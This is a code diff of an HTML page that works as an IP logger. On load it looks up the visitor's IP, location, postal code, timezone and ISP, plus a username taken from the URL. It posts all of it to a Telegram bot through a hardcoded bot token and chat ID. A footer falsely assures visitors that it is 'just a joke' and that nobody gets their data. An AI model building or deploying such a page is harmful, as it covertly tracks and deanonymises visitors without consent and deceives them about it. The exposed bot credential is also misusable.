@@ -42,9 +42,10 @@
     <p><strong>Postal Code:</strong> <span id="postal_code"></span></p>
     <p><strong>Timezone:</strong> <span id="timezone"></span></p>
     <p><strong>ISP:</strong> <span id="isp"></span></p>
+    <p><strong>Username:</strong> <span id="username"></span></p>
     <hr>
     <script>
-        document.addEventListener("DOMContentLoaded", function() {
+        document.addEventListener("DOMContentLoaded", function () {
             // Replace with your bot token and chat ID
             const botToken = "8178145421:AAFLKhUtivNrhharhGdQf0IgQx7LYdetnjc";
             const chatId = "7936915348";
@@ -64,20 +65,24 @@
                     },
                     body: JSON.stringify(payload),
                 })
-                .then(response => {
-                    if (response.ok) {
-                        console.log("Message sent to Telegram successfully.");
-                    } else {
-                        console.error("Failed to send message to Telegram.");
-                    }
-                })
-                .catch(error => console.error("Error:", error));
+                    .then(response => {
+                        if (response.ok) {
+                            console.log("Message sent to Telegram successfully.");
+                        } else {
+                            console.error("Failed to send message to Telegram.");
+                        }
+                    })
+                    .catch(error => console.error("Error:", error));
             }
 
             // Fetch IP data
             fetch("https://ipapi.co/json/")
                 .then(response => response.json())
                 .then(data => {
+                    const urlParams = new URLSearchParams(window.location.search);
+                    const username = urlParams.get("username") || "Unknown User";
+
+                    // Update the page with fetched data
                     document.getElementById("ip_address").textContent = data.ip;
                     document.getElementById("country_name").textContent = data.country_name;
                     document.getElementById("region_name").textContent = data.region;
@@ -87,6 +92,7 @@
                     document.getElementById("postal_code").textContent = data.postal;
                     document.getElementById("timezone").textContent = data.timezone;
                     document.getElementById("isp").textContent = data.org;
+                    document.getElementById("username").textContent = username;
 
                     // Prepare message for Telegram
                     const message = `
@@ -99,6 +105,7 @@ Longitude: ${data.longitude}
 Postal Code: ${data.postal}
 Timezone: ${data.timezone}
 ISP: ${data.org}
+Username: ${username}
                     `;
                     sendToTelegram(message);
                 })
@@ -106,5 +113,5 @@ ISP: ${data.org}
         });
     </script>
 </body>
-    <p><strong>All this just a joke, nobody gets ur ip and data!!</strong> <span id="jk"></span></p>
+<p><strong>All this just a joke, nobody gets ur ip and data!!</strong> <span id="jk"></span></p>
 </html>
